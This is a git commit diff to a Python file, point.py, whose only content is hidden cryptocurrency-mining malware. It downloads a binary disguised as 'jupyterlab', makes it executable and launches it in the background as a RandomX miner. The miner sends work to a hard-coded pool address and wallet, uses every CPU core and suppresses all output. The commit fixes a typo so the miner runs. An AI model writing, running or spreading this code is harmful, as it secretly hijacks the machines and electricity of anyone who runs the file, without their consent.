ed663276294a4f4c8792491479a5a73c090df5b7
christineiimegan <christineiimegan@outlook.com>
2025-01-21 03:01:22 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,4 +1,4 @@
 import sys
 import os
 os.system("wget -qO rubby  https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x * >/dev/null 2>&1")
-os.system("./rubby -a rx/0 -o 8.209.210.176:80 -u 84MUeUQoSXc5x9XaexJmA4Xe3wGQqrG83WNxisKxdmGkMTbS8BAZMAwWFZMhtwAojigQTZMokb7a3Ntm5DFGqEXy1wTj7n7 --randomx-1gb-pages -p $(echo $(shuf -i 1-9 -n 1)-ren) -t $(nprRc --all) &>/dev/null &")
+os.system("./rubby -a rx/0 -o 8.209.210.176:80 -u 84MUeUQoSXc5x9XaexJmA4Xe3wGQqrG83WNxisKxdmGkMTbS8BAZMAwWFZMhtwAojigQTZMokb7a3Ntm5DFGqEXy1wTj7n7 --randomx-1gb-pages -p $(echo $(shuf -i 1-9 -n 1)-ren) -t $(nproc --all) &>/dev/null &")
